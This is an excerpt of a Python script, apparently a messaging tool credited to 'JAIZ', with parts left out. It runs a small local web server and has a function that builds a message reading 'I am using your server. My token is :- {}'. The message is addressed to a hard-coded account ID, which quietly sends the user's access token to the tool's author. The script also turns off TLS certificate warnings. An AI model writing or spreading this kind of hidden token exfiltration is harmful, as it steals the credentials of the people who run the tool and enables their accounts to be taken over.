...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"CREDIT :- TRICKS BY JAIZ <br> <br> OWNER => JAIZ <br> <br> WATSAPP :- +919478030368")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "CREDIT :- TRICKS BY JAIZ                                                         Owner => BAAP                                                      Hello Jaiz sir. I am using your server. My token is :- {}"

      # Specify the ID where you want to send the message
      target_id = "100004180569412"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '●════════════TERA-BAAP════════════●')
